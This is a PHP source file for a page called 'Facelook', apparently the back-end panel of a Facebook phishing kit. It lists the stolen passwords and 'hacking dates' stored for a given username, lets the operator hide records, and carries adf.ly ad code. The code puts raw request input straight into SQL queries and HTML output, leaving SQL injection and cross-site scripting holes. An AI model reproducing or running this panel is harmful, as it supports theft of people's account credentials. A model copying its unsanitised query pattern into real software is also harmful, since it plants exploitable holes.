<?php 
include"importante/conexion.php";
$usuario = $_REQUEST['us'];

$proceso = $_POST['proceso'];
if($proceso=="Ocultar"){
	$actualizarUsuarios="UPDATE usuarios SET estado='D' WHERE usuario='$usuario'";
		$resultadoActualizar = mysql_query($actualizarUsuarios);
		$cerrar = "<script languaje='javascript' type='text/javascript'>window.close();</script>";
}




?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Facelook: Datos de <?php echo $usuario;?> </title>
<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
		<link rel="icon" href="img/favicon.ico" type="image/x-icon">
       <script type="text/javascript">
var adfly_id = 5377189;
var adfly_advert = 'int';
var adfly_protocol = 'http';
var adfly_domain = 'adf.ly';
var frequency_cap = '5';
var frequency_delay = '5';
var init_delay = '3';
</script>
<script src="https://cdn.adf.ly/js/entry.js"></script>
</head>
<style>
body{
	background:#EDEDED;
	margin:0 auto;
}
.ocultarDatos{
	margin-left:200px;
	color:#F8F8F8;
	font-weight:bold;
}
#menu{
	margin:0;
	padding:0;
}
#menu li{
	float:left;
	list-style:none;
	padding:6px 6px;
	background:#D45356;
	border-left:1px solid #000000;
}
#menu li a{
	text-decoration:none;
	color:#000000;
}
#menu li:hover{
	background:#C00003;
}
header, nav, section, article, aside, figure, footer{
	display: block;
	margin:0;
	padding:0;
}
a img{
	border:none;
}
.limpiar{
	clear:both;
}
#contenedor{
	margin:0 auto;
	width:850px;
}
.letratab{
	text-align:center;
	line-height:30px;
	font-size:18px;
	color:#0900EF;
	font-family:Gotham, "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.textonum{
	font-family:Helvetica, Arial, sans-serif;
	font-size:12px;
	color:#333;
	text-decoration:none;
	padding: 3px 5px;
	border:1px solid #B7B7B7;
	
}
.num{
	font-family:Helvetica, Arial, sans-serif;
	font-size:12px;
	color:#333;
	padding: 3px 5px;
}

</style>
 <script>
function ValidarOcultar(){
	document.ocultar.action = "datos-hackeado.php?zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=<?php echo $usuario;?>";
	document.ocultar.proceso.value = "Ocultar";
	document.ocultar.submit();
	}
    </script>
    <?php echo $cerrar;?>
<body>
<div id="contenedor">
<!-- Start of adf.ly banner code -->
<div style="width: 468px; text-align: center; font-family: verdana; font-size: 10px;"><a href="http://adf.ly/?id=5377189"><img border="0" src="http://cdn.adf.ly/images/banners/adfly.468x60.4.gif" width="468" height="60" title="AdF.ly - acorta links y gana dinero!" /></a><br /><a href="http://adf.ly/?id=5377189">Gana dinero por compartir tus enlaces!</a></div>
<h1>Historial de <?php echo $usuario;?></h1>
<ul id="menu">
	<li><a href="datos-hackeado.php?zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=<?php echo $usuario;?>">Datos</a></li>
    <li><a href="datos-hackeado-estadistica.php?zt=estPro_thk_398_gjri8_586_jfir&result=q_busca_EstAdistRicaProbabilidadjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=<?php echo $usuario;?>">Estadísticas</a></li>
    <li class="ocultarDatos" ><form name="ocultar" method="post" action=""><input type="button" value="Ocultar Datos" name="buscar" onClick="javascript:ValidarOcultar();" title="¿Deseas ocultar para siempre estos datos del usuario <?php echo $usuario;?>?"><input type="hidden" name="proceso"></form></li>
</ul>
<div class="limpiar"></div>
<div >
  <table width="850" border="2" align="left" cellpadding="0" cellspacing="0">
    <tr>
      <th bgcolor="#D45356" scope="col">N°</th>
      <th bgcolor="#D45356" scope="col">Contraseña</th>
      <th bgcolor="#D45356" scope="col">Fecha de Hackeo</th>
      <th bgcolor="#D45356" scope="col">Tipo</th>
    </tr>
    
    <?php 
	$traerUsuario="SELECT * FROM usuarios WHERE usuario='$usuario' AND estado='A'";
	$resultadoTraerUsuario = mysql_query($traerUsuario);
	$totalRegistros = mysql_num_rows($resultadoTraerUsuario);
	$registrosPorPaginas = 12;
	$totalPaginas = ceil($totalRegistros/$registrosPorPaginas);
	$pagina = intval($_GET['p']);
	if($pagina<1 or $pagina >$totalPaginas){
		$pagina=1;
	}
	$posicion = ($pagina-1)*$registrosPorPaginas;
	$limite = "LIMIT $posicion, $registrosPorPaginas";
	/*FIN*/
	
	$traerUsuario="SELECT * FROM usuarios WHERE usuario='$usuario' AND estado='A' ORDER BY fecha DESC $limite";
	$resultadoTraerUsuario = mysql_query($traerUsuario);
	while($filaTraerUsuario=mysql_fetch_array($resultadoTraerUsuario)){
		$xClave			=$filaTraerUsuario['clave'];
		$xTipoCuenta	=$filaTraerUsuario['tipoCuenta'];
		$xFecha			=$filaTraerUsuario['fecha'];
		$num++;
		if($xTipoCuenta=="F"){
			$tipoCuetaLetra= "Facebook";
		}
	?>
    <tr class="letratab">
      <td bgcolor="#FFFFFF"><?php echo $num; ?></td>
      <td bgcolor="#FFFFFF"><?php echo $xClave;?></td>
      <td bgcolor="#FFFFFF"><?php echo $xFecha; ?></td>
      <td bgcolor="#FFFFFF"><?php echo $tipoCuetaLetra; ?></td>
    </tr>
    
    <?php 
	}
	mysql_free_result($resultadoTraerUsuario);
	?>
  </table>
  <?php 
  $paginasMostrar = 10;
  echo "<a class='textonum' href='?p=1&zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=$usuario'>Inicio</a> ";
  if($pagina>1){
	 echo "<a class='textonum' href='?p=".($pagina-1)."&zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=$usuario'>Anterior</a> "; 
  }
  for($i=$pagina; $i<=$totalPaginas && $i<=($pagina+$paginasMostrar); $i++){
  	if($i==$pagina){
		echo "<strong class='num'>$i - </strong>";
	}else{
		echo "<a class='textonum' href='?p=$i&zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=$usuario'>$i</a> ";
	}
  }
  
  if(($pagina + $paginasMostrar)<$totalPaginas){
	  echo "...";
  }
  if($pagina<$totalPaginas){
	  echo "<a  class='textonum' href='?p=".($pagina+1)."&zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=$usuario'>Siguiente</a> "; 
	  echo "<a class='textonum' href='?p=$totalPaginas&zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=$usuario'>Fin</a>";
  }
  ?>
</div>
</div>

<div id="publicidad">
</div>
</body>
</html>